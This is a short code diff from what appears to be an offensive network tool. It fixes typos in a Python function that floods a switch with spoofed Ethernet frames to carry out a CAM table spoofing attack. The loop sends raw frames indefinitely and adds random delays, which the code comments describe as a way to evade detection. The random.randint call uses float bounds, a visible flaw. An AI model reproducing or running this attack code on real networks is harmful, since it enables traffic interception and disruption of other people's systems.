@@ -117,11 +117,11 @@ def cam_spoofing():
         print(f"[INFO] Attacker MAC address: {mac_src}")
     try:
         while True:
-            time.sleep(random.randint(0.0000, 0.0005)) # Random sleep to avooid detection
+            time.sleep(random.randint(0.0000, 0.0005)) # Random sleep to avoid detection
             mac_dst = args.mac
             eth_type = 0x0800 # IPv4
             payload = b"A" * 46 # Minimum Ethernet fram size
-            packet = bytes.fromhex(mac_dst.replace(":", "")) + bytes.fromhex(mac_src.replace(":", "")) + eth_type.to_bytes(2, byteorder='biig') + payload
+            packet = bytes.fromhex(mac_dst.replace(":", "")) + bytes.fromhex(mac_src.replace(":", "")) + eth_type.to_bytes(2, byteorder='big') + payload
             s.send(packet)
     except KeyboardInterrupt:
         print("[-] CAM Spoofing attack stopped.")
